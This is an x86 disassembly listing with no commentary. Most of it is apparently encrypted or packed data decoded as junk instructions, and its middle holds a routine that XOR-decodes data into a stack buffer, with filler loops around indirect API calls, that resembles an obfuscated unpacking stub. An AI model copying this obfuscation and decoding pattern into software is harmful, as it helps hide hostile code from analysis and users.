  410c6f:	push   eax
  410c70:	sub    eax,0x4705da50
  410c75:	sbb    esi,ebx
  410c77:	mov    cl,0x95
  410c79:	cmp    ecx,edx
  410c7b:	ins    BYTE PTR es:[edi],dx
  410c7c:	(bad)  
  410c7d:	mov    ch,cl
  410c7f:	in     eax,dx
  410c80:	popf   
  410c81:	mov    eax,0x792e1468
  410c86:	(bad)  
  410c87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c88:	adc    DWORD PTR [edi+0xe],eax
  410c8b:	lds    ebx,FWORD PTR [ecx*4+0x1d042113]
  410c92:	pop    ebx
  410c93:	daa    
  410c94:	inc    ebx
  410c95:	data16 arpl WORD PTR [edi],ax
  410c98:	dec    edi
  410c99:	pop    edi
  410c9a:	mov    WORD PTR [eax-0x4a],ss
  410c9d:	cmp    bh,0xa7
  410ca0:	aad    0xcb
  410ca2:	mov    es,WORD PTR [eax]
  410ca4:	pop    edi
  410ca5:	hlt    
  410ca6:	jo     0x410c42
  410ca8:	cmp    cl,BYTE PTR ds:0x7f3ebac1
  410cae:	pop    es
  410caf:	xor    eax,0x5fda0771
  410cb4:	sub    BYTE PTR [ebx-0x54],al
  410cb7:	mov    eax,0x57ad9ead
  410cbc:	aaa    
  410cbd:	xchg   esi,eax
  410cbe:	push   0x248af783
  410cc3:	adc    BYTE PTR [esp+eax*4],cl
  410cc6:	lock outs dx,DWORD PTR ds:[esi]
  410cc8:	stc    
  410cc9:	popf   
  410cca:	mov    eax,ds:0x78f6a1e9
  410ccf:	push   0xfa9f23c3
  410cd4:	ror    BYTE PTR [eax+0x2a],0x40
  410cd8:	shr    BYTE PTR [esi+0x2417b7aa],1
  410cde:	scas   eax,DWORD PTR es:[edi]
  410cdf:	outs   dx,BYTE PTR ds:[esi]
  410ce0:	mov    esi,0x8f300da8
  410ce5:	cmp    BYTE PTR [ebx-0x6c],dl
  410ce8:	fistp  DWORD PTR [edx+0x76]
  410ceb:	mov    eax,ds:0xb95389c9
  410cf0:	and    ch,dh
  410cf2:	outs   dx,BYTE PTR ds:[esi]
  410cf3:	clc    
  410cf4:	fxch   st(7)
  410cf6:	xor    dh,ah
  410cf8:	cli    
  410cf9:	stc    
  410cfa:	mov    cl,0x44
  410cfc:	push   ebp
  410cfd:	cdq    
  410cfe:	cmp    eax,0x79a741d7
  410d03:	inc    esi
  410d04:	jae    0x410d5e
  410d06:	adc    al,0x1b
  410d08:	out    0x36,eax
  410d0a:	addr16 repz loope 0x410d3c
  410d0e:	retf   0xa922
  410d11:	sar    BYTE PTR [ebp+0x3ac9bb75],cl
  410d17:	mov    al,ds:0x993c0b5e
  410d1c:	ficom  WORD PTR [eax+0x3f]
  410d1f:	pop    edi
  410d20:	clc    
  410d21:	mov    eax,ds:0x66ccf562
  410d26:	mov    BYTE PTR [edx+edx*1],cl
  410d29:	adc    DWORD PTR [esi+0x603d45df],ebp
  410d2f:	and    esp,DWORD PTR [ebx+0x3126ecb4]
  410d35:	add    al,BYTE PTR ds:0xdcc2602e
  410d3b:	sbb    BYTE PTR ds:0x7d9b642b,0x4e
  410d42:	jne    0x410d96
  410d44:	cmp    ebx,DWORD PTR [ebp+0x4ab3e644]
  410d4a:	sub    edx,ebp
  410d4c:	pop    es
  410d4d:	nop
  410d4e:	aad    0x39
  410d50:	push   ss
  410d51:	lahf   
  410d52:	inc    ebp
  410d53:	jb     0x410d5a
  410d55:	xchg   ebp,eax
  410d56:	or     eax,0x259330fe
  410d5b:	shl    BYTE PTR [ebx+0x38],0x33
  410d5f:	mov    edx,0xf5997963
  410d64:	jns    0x410dc9
  410d66:	test   DWORD PTR [edx-0x4b],esp
  410d69:	into   
  410d6a:	test   DWORD PTR [esi*4-0x376e9cd2],ecx
  410d71:	mov    edx,0x9e93f65
  410d76:	loop   0x410d75
  410d78:	cld    
  410d79:	rol    DWORD PTR [ecx+0x1a],1
  410d7c:	adc    DWORD PTR [edi],0xffffffe8
  410d7f:	xor    DWORD PTR [edi-0x674c69bd],ebp
  410d85:	es jge 0x410df9
  410d88:	scas   eax,DWORD PTR es:[edi]
  410d89:	mov    ebx,0x8af696af
  410d8e:	ret    0x3533
  410d91:	and    DWORD PTR [edx+0x54],eax
  410d94:	hlt    
  410d95:	mov    ?,WORD PTR [ebx]
  410d97:	test   ecx,ebp
  410d99:	fsubr  QWORD PTR [ebp-0x1]
  410d9c:	jmp    0x410d6b
  410d9e:	stos   DWORD PTR es:[edi],eax
  410d9f:	fidivr DWORD PTR [esi]
  410da1:	addr16 dec ecx
  410da3:	out    0x6,al
  410da5:	mov    bh,0x84
  410da7:	not    DWORD PTR [edx-0x35cfd61c]
  410dad:	fmul   DWORD PTR [esi+0x575f6c7a]
  410db3:	loopne 0x410d63
  410db5:	sub    DWORD PTR [eax],esi
  410db7:	xchg   BYTE PTR [ecx+0x27d0e6c7],bh
  410dbd:	loopne 0x410dae
  410dbf:	sbb    al,bl
  410dc1:	add    edi,ebp
  410dc3:	cmp    al,0xa0
  410dc5:	lds    ebx,FWORD PTR [edx]
  410dc7:	cld    
  410dc8:	fisttp DWORD PTR [ebx]
  410dca:	mov    eax,ds:0x3a804d10
  410dcf:	imul   edi,ebx,0xffffffa1
  410dd2:	add    DWORD PTR [edi+0x1],0xffffffa2
  410dd6:	and    bh,BYTE PTR [ebx]
  410dd8:	lea    esp,[ebx+esi*1+0x410b229b]
  410ddf:	retf   
  410de0:	push   es
  410de1:	(bad)  
  410de2:	push   cs
  410de3:	push   es
  410de4:	push   cs
  410de5:	dec    edx
  410de6:	sbb    ebp,DWORD PTR [ebp+0x5a]
  410de9:	or     BYTE PTR [edi+0x19],dh
  410dec:	sub    eax,0x978350eb
  410df1:	push   edx
  410df2:	ss push ebp
  410df4:	dec    esp
  410df5:	cmp    bl,BYTE PTR [ebx-0x640cad74]
  410dfb:	sbb    BYTE PTR [ebx],bl
  410dfd:	dec    ebx
  410dfe:	fimul  DWORD PTR [ebx-0x213994e1]
  410e05:	nop
  410e06:	sub    al,dl
  410e08:	loope  0x410da3
  410e0a:	mov    WORD PTR [eax],es
  410e0c:	push   edx
  410e0d:	mov    bl,0x3
  410e0f:	adc    bl,ah
  410e11:	adc    bh,bl
  410e13:	fcomip st,st(6)
  410e15:	sub    ecx,DWORD PTR [edi-0x3f]
  410e18:	fiadd  DWORD PTR [ebp+0x3904a7e]
  410e1e:	scas   eax,DWORD PTR es:[edi]
  410e1f:	add    eax,0x942f401
  410e24:	xchg   BYTE PTR [eax],al
  410e26:	imul   ecx,DWORD PTR [ecx+0x31],0xb31cc5af
  410e2d:	mov    BYTE PTR [ecx+0x4e72cdaa],al
  410e33:	or     DWORD PTR [eax],edi
  410e35:	ss push ss
  410e37:	pop    edx
  410e38:	rcl    DWORD PTR [ebx+0x3cca9979],cl
  410e3e:	mov    ah,0x15
  410e40:	loop   0x410ead
  410e42:	mov    ah,0x4d
  410e44:	test   BYTE PTR [ebp-0x6b],dl
  410e47:	mov    dh,0x72
  410e49:	jne    0x410e7e
  410e4b:	sbb    ah,BYTE PTR [ecx-0x7e]
  410e4e:	push   edi
  410e4f:	pop    esp
  410e50:	cmp    al,0x91
  410e52:	or     DWORD PTR [esi-0x68],0xffffff94
  410e56:	adc    bl,0x74
  410e59:	es sti 
  410e5b:	(bad)  
  410e5d:	cmp    eax,0xc26232bd
  410e62:	pop    ds
  410e63:	sbb    BYTE PTR [eax+0x10],cl
  410e66:	pop    ecx
  410e67:	int3   
  410e68:	jl     0x410ee1
  410e6a:	xchg   edi,eax
  410e6b:	inc    ebx
  410e6c:	mul    BYTE PTR [edi]
  410e6e:	add    eax,0x192182e9
  410e73:	test   al,0x85
  410e75:	sar    ebx,0x6b
  410e78:	scas   al,BYTE PTR es:[edi]
  410e79:	ds icebp 
  410e7b:	sub    al,0x13
  410e7d:	push   ebp
  410e7e:	dec    eax
  410e7f:	mov    dl,0x82
  410e81:	fld    TBYTE PTR [esp+ecx*8-0x11]
  410e85:	sar    DWORD PTR [ebp+0x71],1
  410e88:	pop    eax
  410e89:	push   cs
  410e8a:	clc    
  410e8b:	mov    bl,cl
  410e8d:	scas   eax,DWORD PTR es:[edi]
  410e8e:	adc    DWORD PTR [ebp-0x36b5c8d4],esp
  410e94:	ds jbe 0x410e75
  410e97:	out    dx,eax
  410e98:	das    
  410e99:	dec    esp
  410e9a:	cmc    
  410e9b:	test   DWORD PTR [esi],edi
  410e9d:	dec    esi
  410e9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e9f:	mov    ebx,0xfa7e8d09
  410ea4:	adc    edx,ebp
  410ea6:	sub    ecx,DWORD PTR [ebx]
  410ea8:	push   0x941436bb
  410ead:	imul   BYTE PTR [eax+0x5e]
  410eb0:	sub    esi,DWORD PTR [esi+0x77df9ea0]
  410eb6:	fcmovb st,st(1)
  410eb8:	sar    BYTE PTR [ebp+0x11],1
  410ebb:	sub    BYTE PTR [eax+0x1853e323],cl
  410ec1:	fisttp QWORD PTR [ebx]
  410ec3:	sbb    ah,bh
  410ec5:	(bad)  
  410ec6:	imul   ebx,edi,0xffffffcb
  410ec9:	jnp    0x410e8f
  410ecb:	pop    es
  410ecc:	pop    ecx
  410ecd:	pop    esp
  410ece:	clc    
  410ecf:	sar    DWORD PTR [esi],0x0
  410ed2:	out    dx,al
  410ed3:	cmp    DWORD PTR [esi+0x20303ba4],eax
  410ed9:	fadd   st(5),st
  410edb:	les    esp,FWORD PTR ds:0x22fe53f8
  410ee1:	inc    ecx
  410ee2:	push   ss
  410ee3:	neg    bh
  410ee5:	pop    ds
  410ee6:	xchg   ebp,eax
  410ee7:	mov    cl,0xef
  410ee9:	mov    edi,0x9556435c
  410eee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410eef:	sti    
  410ef0:	pop    edx
  410ef1:	pop    ebp
  410ef2:	mov    BYTE PTR [ebx-0x185b0c49],bl
  410ef8:	cmc    
  410ef9:	fsub   QWORD PTR [esp+ecx*8]
  410efc:	test   al,0xa7
  410efe:	xchg   BYTE PTR [esi],cl
  410f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f01:	int    0x9e
  410f03:	xor    al,0x1a
  410f05:	outs   dx,DWORD PTR ds:[esi]
  410f06:	sub    al,0x91
  410f08:	jecxz  0x410f47
  410f0a:	adc    edi,edx
  410f0c:	cmp    DWORD PTR [eax+ebp*8],ebx
  410f0f:	mov    DWORD PTR [ebx-0x26ea9184],esi
  410f15:	in     al,0xf4
  410f17:	inc    eax
  410f18:	xchg   DWORD PTR [edi+0x1b0bbc9d],ebp
  410f1e:	sub    dl,cl
  410f20:	pop    ebp
  410f21:	(bad)  
  410f22:	jge    0x410ec8
  410f24:	mov    eax,es
  410f26:	cs iret 
  410f28:	dec    edx
  410f29:	jg     0x410ee6
  410f2b:	inc    ecx
  410f2c:	loop   0x410ef8
  410f2e:	mov    ds:0xe27294d3,eax
  410f33:	and    bl,BYTE PTR [ebx-0x4c]
  410f36:	bound  esi,QWORD PTR [eax-0x1ede61d7]
  410f3c:	ror    eax,0x90
  410f3f:	aaa    
  410f40:	sub    BYTE PTR [eax+0x29d31348],dl
  410f46:	mov    WORD PTR [ebx+esi*8+0x6017e92e],ds
  410f4d:	mov    DWORD PTR [edi+0x424cd043],ebp
  410f53:	mov    al,0xa6
  410f55:	ret    0x4dcd
  410f58:	ins    BYTE PTR es:[edi],dx
  410f59:	sti    
  410f5a:	mov    DWORD PTR [ebp+0x21],eax
  410f5d:	sbb    BYTE PTR [eax],bh
  410f5f:	(bad)  
  410f60:	xchg   edx,eax
  410f61:	ins    BYTE PTR es:[edi],dx
  410f62:	sbb    eax,0x60f5dd3b
  410f67:	xchg   ebp,eax
  410f68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f69:	push   ebp
  410f6a:	test   BYTE PTR [ebx-0x71399805],dh
  410f70:	pop    esi
  410f71:	mov    BYTE PTR [edx-0x42],dl
  410f74:	(bad)  [esi]
  410f76:	out    0x83,eax
  410f78:	shl    BYTE PTR [eax-0xfe6ad88],0xb6
  410f7f:	lods   eax,DWORD PTR ds:[esi]
  410f80:	std    
  410f81:	ret    0x31ba
  410f84:	leave  
  410f85:	mov    bl,0x3b
  410f87:	or     DWORD PTR [edi],edi
  410f89:	popf   
  410f8a:	out    dx,eax
  410f8b:	adc    BYTE PTR [edi+0x29],dl
  410f8e:	fist   WORD PTR [ebp+ebp*1-0x6b]
  410f92:	pop    esp
  410f93:	or     eax,0xde4c3998
  410f98:	or     BYTE PTR [esi-0x5588fccf],ah
  410f9e:	(bad)  
  410f9f:	pop    eax
  410fa0:	(bad)  
  410fa1:	std    
  410fa2:	xor    edx,DWORD PTR [edx]
  410fa4:	xchg   DWORD PTR [ebx-0x1341ffb],esi
  410faa:	and    DWORD PTR [edi+0x6f],edx
  410fad:	das    
  410fae:	loopne 0x410fd0
  410fb0:	ror    DWORD PTR [edx+0x4d],1
  410fb3:	mov    eax,ds:0xb425df26
  410fb8:	push   edi
  410fb9:	inc    ecx
  410fba:	xchg   edx,eax
  410fbb:	sahf   
  410fbc:	jbe    0x410ffc
  410fbe:	push   ss
  410fbf:	idiv   DWORD PTR [esi+0x6a]
  410fc2:	mul    BYTE PTR fs:[ebp+0x5]
  410fc6:	dec    edi
  410fc7:	mov    cl,0x29
  410fc9:	(bad)  
  410fca:	mov    ds:0x2c3e1e59,eax
  410fcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fd0:	sbb    ah,al
  410fd2:	push   edi
  410fd3:	call   0x3c8b:0x8f53698a
  410fda:	jmp    0xb9ef:0x62460cfd
  410fe1:	xlat   BYTE PTR ds:[ebx]
  410fe2:	jae    0x410f83
  410fe4:	in     al,0x46
  410fe6:	push   eax
  410fe7:	leave  
  410fe8:	sbb    al,0xb9
  410fea:	gs inc edi
  410fec:	scas   al,BYTE PTR es:[edi]
  410fed:	add    DWORD PTR [ebx+0x65cc2d47],esp
  410ff3:	push   ss
  410ff4:	sub    BYTE PTR [eax+0x648ec67],0x6f
  410ffb:	mov    ds:0xf30bb1b6,eax
  411000:	sub    dh,BYTE PTR es:[esi-0x1645ceeb]
  411007:	in     al,dx
  411008:	sub    ch,BYTE PTR [esp+ebx*8]
  41100b:	adc    ebp,DWORD PTR [edx]
  41100d:	fidiv  DWORD PTR [eax]
  41100f:	lds    ecx,FWORD PTR [esi+edx*1+0x35f0aef2]
  411016:	lds    ebp,FWORD PTR [ebp+0x2d833bc3]
  41101c:	aam    0x1e
  41101e:	dec    eax
  41101f:	inc    eax
  411020:	shl    ecx,1
  411022:	ins    BYTE PTR es:[edi],dx
  411023:	loop   0x410fb0
  411025:	dec    ebp
  411026:	or     BYTE PTR [eax+0x8a8d],bh
  41102c:	xor    ax,WORD PTR [ecx+0x20]
  411030:	adc    DWORD PTR ds:0x42b000,0x1520
  41103a:	mov    ecx,0x3b51
  41103f:	or     DWORD PTR ds:0x42a008,0x52f2
  411049:	add    ax,cx
  41104c:	or     DWORD PTR ds:0x42c010,ebx
  411052:	movzx  eax,ax
  411055:	mov    DWORD PTR [ebp-0x10],eax
  411058:	xor    DWORD PTR ds:0x429020,ecx
  41105e:	mov    BYTE PTR [ebp-0x1],0x7d
  411062:	lea    eax,[ebp-0x1]
  411065:	and    ecx,DWORD PTR ds:0x429024
  41106b:	mov    DWORD PTR [ebp-0xc],eax
  41106e:	mov    al,BYTE PTR [ebp-0x1]
  411071:	mov    ecx,DWORD PTR [ebp-0xc]
  411074:	xor    DWORD PTR ds:0x42d014,0x42a010
  41107e:	xor    al,0x74
  411080:	sub    al,0x8
  411082:	add    DWORD PTR ds:0x42901c,0x5bfc
  41108c:	mov    BYTE PTR [ecx],al
  41108e:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  411095:	and    DWORD PTR ds:0x42d004,0x0
  41109f:	jmp    0x4110b3
  4110a4:	xor    ecx,ecx
  4110a6:	add    ecx,DWORD PTR ds:0x42d004
  4110ac:	inc    ecx
  4110ad:	mov    DWORD PTR ds:0x42d004,ecx
  4110b3:	cmp    DWORD PTR ds:0x42d004,0x1a
  4110ba:	jae    0x4110fe
  4110c0:	cmp    DWORD PTR ds:0x42d004,0x5
  4110c7:	jne    0x4110d3
  4110cd:	call   DWORD PTR ds:0x42e8f3
  4110d3:	cmp    DWORD PTR ds:0x42d004,0x4
  4110da:	jne    0x4110ef
  4110e0:	xor    ecx,ecx
  4110e2:	xor    ecx,DWORD PTR ds:0x42d004
  4110e8:	inc    ecx
  4110e9:	mov    DWORD PTR ds:0x42d004,ecx
  4110ef:	jmp    0x4110a4
  4110f4:	mov    DWORD PTR ds:0x42901c,0x6887
  4110fe:	push   ebx
  4110ff:	and    DWORD PTR ds:0x42c008,0x0
  411109:	jmp    0x411119
  41110e:	mov    eax,ds:0x42c008
  411113:	inc    eax
  411114:	mov    ds:0x42c008,eax
  411119:	cmp    DWORD PTR ds:0x42c008,0x19
  411120:	jae    0x4111a1
  411126:	cmp    DWORD PTR ds:0x42c008,0x5
  41112d:	jne    0x41113e
  411133:	push   0x42e000
  411138:	call   DWORD PTR ds:0x42e8f7
  41113e:	cmp    DWORD PTR ds:0x42c008,0x4
  411145:	jne    0x411156
  41114b:	mov    eax,ds:0x42c008
  411150:	inc    eax
  411151:	mov    ds:0x42c008,eax
  411156:	jmp    0x41110e
  41115b:	and    DWORD PTR ds:0x429024,0x0
  411165:	mov    ecx,DWORD PTR ds:0x429024
  41116b:	inc    ecx
  41116c:	mov    DWORD PTR ds:0x429024,ecx
  411172:	cmp    DWORD PTR ds:0x429024,0x21
  411179:	jne    0x411192
  41117f:	push   DWORD PTR [ebp-0x14]
  411182:	push   0x42d018
  411187:	push   0x6b2d
  41118c:	call   DWORD PTR ds:0x42e8bf
  411192:	cmp    DWORD PTR ds:0x429024,0x17
  411199:	jb     0x411165
  41119f:	xor    eax,eax
  4111a1:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4111a8:	and    DWORD PTR ds:0x42a008,0x0
  4111b2:	jmp    0x4111c5
  4111b7:	xor    eax,eax
  4111b9:	or     eax,DWORD PTR ds:0x42a008
  4111bf:	inc    eax
  4111c0:	mov    ds:0x42a008,eax
  4111c5:	cmp    DWORD PTR ds:0x42a008,0x14
  4111cc:	jae    0x41120d
  4111d2:	cmp    DWORD PTR ds:0x42a008,0x5
  4111d9:	jne    0x4111ea
  4111df:	push   0x42e067
  4111e4:	call   DWORD PTR ds:0x42e8fb
  4111ea:	cmp    DWORD PTR ds:0x42a008,0x4
  4111f1:	jne    0x411202
  4111f7:	mov    eax,ds:0x42a008
  4111fc:	inc    eax
  4111fd:	mov    ds:0x42a008,eax
  411202:	jmp    0x4111b7
  411207:	xor    DWORD PTR ds:0x42a018,edx
  41120d:	mov    ecx,DWORD PTR [ebp-0x18]
  411210:	dec    DWORD PTR ds:0x42a010
  411216:	push   esi
  411217:	mov    eax,0x751089b
  41121c:	mov    esi,DWORD PTR ds:0x41cda1
  411222:	mov    esi,DWORD PTR [esi]
  411224:	sub    DWORD PTR ds:0x429028,esi
  41122a:	xor    ecx,eax
  41122c:	inc    esi
  41122d:	mov    esi,0x3272e2
  411232:	add    DWORD PTR ds:0x42b008,0x42d010
  41123c:	push   edi
  41123d:	or     DWORD PTR ds:0x42b004,0x429028
  411247:	add    ecx,esi
  411249:	jmp    0x411277
  41124e:	mov    DWORD PTR ds:0x42c00c,0x285a
  411258:	mov    dl,BYTE PTR [ebp-0x1]
  41125b:	mov    DWORD PTR ds:0x42a00c,0x78fc
  411265:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41126c:	mov    DWORD PTR ds:0x429024,0x3f09
  411276:	inc    ecx
  411277:	mov    DWORD PTR ds:0x42a00c,0x5b6f
  411281:	cmp    ecx,0x40
  411284:	mov    DWORD PTR ds:0x42d01c,0x4c47
  41128e:	jb     0x41124e
  411294:	mov    edx,DWORD PTR [ebp-0x18]
  411297:	xor    edx,eax
  411299:	add    edx,esi
  41129b:	jmp    0x41130b
  4112a0:	sub    edi,ecx
  4112a2:	mov    edi,DWORD PTR [ebp+0x8]
  4112a5:	add    ecx,0x4f49
  4112ab:	mov    ecx,0x8a8d
  4112b0:	xor    cx,WORD PTR [edi+edx*4+0x2]
  4112b5:	sub    edi,DWORD PTR ds:0x42b00c
  4112bb:	mov    edi,0x3b51
  4112c0:	xor    DWORD PTR ds:0x42c01c,0x429014
  4112ca:	add    cx,di
  4112cd:	movzx  ecx,cx
  4112d0:	mov    DWORD PTR [ebp-0xc],ecx
  4112d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d6:	sbb    DWORD PTR ds:0x42b000,0x42d008
  4112e0:	movzx  ecx,WORD PTR [ecx+edx*4]
  4112e4:	xor    ecx,0x8a8d
  4112ea:	adc    DWORD PTR ds:0x42b014,0x42b008
  4112f4:	add    ecx,edi
  4112f6:	mov    edi,DWORD PTR [ebp-0xc]
  4112f9:	mov    DWORD PTR ds:0x42b018,0x62b9
  411303:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  41130a:	inc    edx
  41130b:	mov    ecx,DWORD PTR [ebp-0x10]
  41130e:	mov    DWORD PTR ds:0x42a00c,0x6d31
  411318:	cmp    edx,ecx
  41131a:	mov    DWORD PTR ds:0x429018,0x5128
  411324:	jne    0x4112a0
  41132a:	mov    DWORD PTR ds:0x42c018,0x17
  411334:	cmp    DWORD PTR ds:0x42c018,0x0
  41133b:	je     0x411388
  411341:	cmp    DWORD PTR ds:0x42c018,0x8
  411348:	jne    0x411354
  41134e:	call   DWORD PTR ds:0x42e8ff
  411354:	cmp    DWORD PTR ds:0x42c018,0x9
  41135b:	jne    0x411370
  411361:	xor    edx,edx
  411363:	add    edx,DWORD PTR ds:0x42c018
  411369:	dec    edx
  41136a:	mov    DWORD PTR ds:0x42c018,edx
  411370:	mov    edx,DWORD PTR ds:0x42c018
  411376:	dec    edx
  411377:	mov    DWORD PTR ds:0x42c018,edx
  41137d:	jmp    0x411334
  411382:	adc    ecx,0x40c
  411388:	mov    ecx,DWORD PTR [ebp-0x18]
  41138b:	or     edi,edi
  41138d:	mov    edx,DWORD PTR [ebp+0x10]
  411390:	neg    edi
  411392:	xor    ecx,eax
  411394:	add    DWORD PTR ds:0x42b01c,ebx
  41139a:	add    ecx,esi
  41139c:	mov    DWORD PTR [edx],ecx
  41139e:	and    DWORD PTR ds:0x42b014,0x0
  4113a8:	mov    ecx,DWORD PTR ds:0x42b014
  4113ae:	inc    ecx
  4113af:	mov    DWORD PTR ds:0x42b014,ecx
  4113b5:	cmp    DWORD PTR ds:0x42b014,0x4
  4113bc:	jne    0x4113d5
  4113c2:	push   0x44ec
  4113c7:	push   0x42901c
  4113cc:	push   DWORD PTR [ebp-0x18]
  4113cf:	call   DWORD PTR ds:0x42e903
  4113d5:	cmp    DWORD PTR ds:0x42b014,0x3
  4113dc:	jne    0x4113ef
  4113e2:	mov    ecx,DWORD PTR ds:0x42b014
  4113e8:	inc    ecx
  4113e9:	mov    DWORD PTR ds:0x42b014,ecx
  4113ef:	cmp    DWORD PTR ds:0x42b014,0x13
  4113f6:	jb     0x4113a8
  4113fc:	or     edi,edi
  4113fe:	mov    ecx,DWORD PTR [ebp-0x18]
  411401:	xor    ecx,eax
  411403:	sbb    DWORD PTR ds:0x429004,0x2443
  41140d:	add    ecx,esi
  41140f:	mov    DWORD PTR [ebp-0xc],ecx
  411412:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  411419:	mov    DWORD PTR ds:0x429014,0x17
  411423:	cmp    DWORD PTR ds:0x429014,0x0
  41142a:	je     0x411491
  411430:	cmp    DWORD PTR ds:0x429014,0xb
  411437:	jne    0x411450
  41143d:	push   0x0
  41143f:	push   DWORD PTR [ebp-0x1c]
  411442:	push   0x533d
  411447:	push   DWORD PTR [ebp-0x10]
  41144a:	call   DWORD PTR ds:0x42e8c3
  411450:	cmp    DWORD PTR ds:0x429014,0xc
  411457:	jne    0x41146c
  41145d:	xor    ecx,ecx
  41145f:	or     ecx,DWORD PTR ds:0x429014
  411465:	dec    ecx
  411466:	mov    DWORD PTR ds:0x429014,ecx
  41146c:	mov    ecx,DWORD PTR ds:0x429014
  411472:	dec    ecx
  411473:	mov    DWORD PTR ds:0x429014,ecx
  411479:	jmp    0x411423
  41147e:	xor    edi,edi
  411480:	xor    edi,DWORD PTR ds:0x41cddc
  411486:	mov    ecx,DWORD PTR ds:0x41cd75
  41148c:	sub    ecx,edi
  41148e:	or     edi,DWORD PTR [edi+ecx*1]
  411491:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  411498:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  41149f:	and    DWORD PTR ds:0x42d00c,0x0
  4114a9:	mov    ecx,DWORD PTR ds:0x42d00c
  4114af:	inc    ecx
  4114b0:	mov    DWORD PTR ds:0x42d00c,ecx
  4114b6:	cmp    DWORD PTR ds:0x42d00c,0x10
  4114bd:	jne    0x4114d5
  4114c3:	push   DWORD PTR [ebp-0xc]
  4114c6:	push   DWORD PTR [ebp-0x1c]
  4114c9:	push   DWORD PTR [ebp-0xc]
  4114cc:	push   DWORD PTR [ebp-0x10]
  4114cf:	call   DWORD PTR ds:0x42e8c7
  4114d5:	cmp    DWORD PTR ds:0x42d00c,0xf
  4114dc:	jne    0x4114ef
  4114e2:	mov    ecx,DWORD PTR ds:0x42d00c
  4114e8:	inc    ecx
  4114e9:	mov    DWORD PTR ds:0x42d00c,ecx
  4114ef:	cmp    DWORD PTR ds:0x42d00c,0x1c
  4114f6:	jb     0x4114a9
  4114fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4114ff:	mov    DWORD PTR [ebp+0x8],ecx
  411502:	mov    ecx,DWORD PTR [ebp+0x8]
  411505:	mov    DWORD PTR ds:0x42d008,0x14
  41150f:	cmp    DWORD PTR ds:0x42d008,0x0
  411516:	je     0x411548
  41151c:	cmp    DWORD PTR ds:0x42d008,0x16
  411523:	jne    0x411534
  411529:	push   0x7bbf
  41152e:	call   DWORD PTR ds:0x42e8cb
  411534:	xor    edi,edi
  411536:	add    edi,DWORD PTR ds:0x42d008
  41153c:	dec    edi
  41153d:	mov    DWORD PTR ds:0x42d008,edi
  411543:	jmp    0x41150f
  411548:	xor    ecx,eax
  41154a:	movzx  edi,BYTE PTR ds:0x429004
  411551:	sub    edi,DWORD PTR ds:0x429014
  411557:	mov    DWORD PTR ds:0x429004,edi
  41155d:	add    ecx,esi
  41155f:	mov    DWORD PTR ds:0x42c008,0x216c
  411569:	mov    ecx,0x242ebe9
  41156e:	mov    edi,0x5a28
  411573:	mov    edi,0xf641bea
  411578:	je     0x41cc2e
  41157e:	or     DWORD PTR ds:0x42a018,0xc8d
  411588:	mov    edx,DWORD PTR [ebp+0x8]
  41158b:	mov    ebx,DWORD PTR [ebp-0x8]
  41158e:	and    DWORD PTR ds:0x42a008,0xb9b
  411598:	xor    edx,eax
  41159a:	jmp    0x4138e3
  41159f:	test   DWORD PTR [edx-0x500c52df],edx
  4115a5:	jno    0x411619
  4115a7:	(bad)  
  4115a8:	cmc    
  4115a9:	jo     0x41159c
  4115ab:	inc    ebp
  4115ac:	lea    esi,[ebx-0x5]
  4115af:	inc    eax
  4115b0:	scas   eax,DWORD PTR es:[edi]
  4115b1:	jl     0x41162f
  4115b3:	inc    eax
  4115b4:	pop    edi
  4115b5:	jl     0x411633
  4115b7:	mov    esi,gs
  4115b9:	jge    0x411562
  4115bb:	xor    eax,0x7f5c6867
  4115c0:	mov    dh,0xc4
  4115c2:	sbb    al,0x7f
  4115c4:	and    al,0xe6
  4115c6:	dec    esi
  4115c7:	fsubrp st(1),st
  4115c9:	imul   esi,DWORD PTR [eax],0x25e5db77
  4115cf:	daa    
  4115d0:	xchg   ebp,eax
  4115d1:	clc    
  4115d2:	jp     0x411643
  4115d4:	ret    
  4115d5:	ds std 
  4115d7:	mov    al,ds:0xb0795986
  4115dd:	or     cl,BYTE PTR [ecx]
  4115df:	push   esp
  4115e0:	das    
  4115e1:	pop    edi
  4115e2:	scas   al,BYTE PTR es:[edi]
  4115e3:	nop
  4115e4:	ins    DWORD PTR es:[edi],dx
  4115e5:	sbb    edx,0x8403ef5b
  4115eb:	sahf   
  4115ec:	fwait
  4115ed:	xchg   ecx,eax
  4115ee:	cld    
  4115ef:	adc    eax,0xe8497a4f
  4115f4:	mov    edi,0x69f7c960
  4115f9:	les    ebx,FWORD PTR ds:0xabc44261
  4115ff:	shl    DWORD PTR ds:0x1cea85c0,cl
  411605:	out    dx,eax
  411606:	pop    eax
  411607:	and    dl,BYTE PTR [eax-0x3b]
  41160a:	data16 das 
  41160c:	push   edi
  41160d:	(bad)  
  41160e:	test   DWORD PTR [ebx],0x8520a207
  411614:	adc    DWORD PTR [ebx-0x40],0xffffffa7
  411618:	out    0xd6,al
  41161a:	jo     0x411692
  41161c:	xchg   ebp,eax
  41161d:	pusha  
  41161e:	jae    0x41167d
  411620:	mov    ebp,0xba452954
  411625:	or     BYTE PTR [eax+0x13eb3db2],0x78
  41162c:	mov    eax,ds:0xd7cff680
  411631:	add    BYTE PTR [ebx-0x65],ah
  411634:	cld    
  411635:	and    al,0x51
  411637:	mov    eax,0x9c44f55f
  41163c:	inc    edx
  41163d:	push   esi
  41163e:	shl    BYTE PTR [ebx+0x28],0x24
  411642:	or     DWORD PTR [edi+0x7d19c04a],edi
  411648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411649:	push   ss
  41164a:	xor    BYTE PTR [edi+esi*2-0x6fa76242],cl
  411651:	test   DWORD PTR [eax-0x2],esi
  411654:	cmp    al,0xe
  411656:	jge    0x4116a0
  411658:	sti    
  411659:	adc    al,0x43
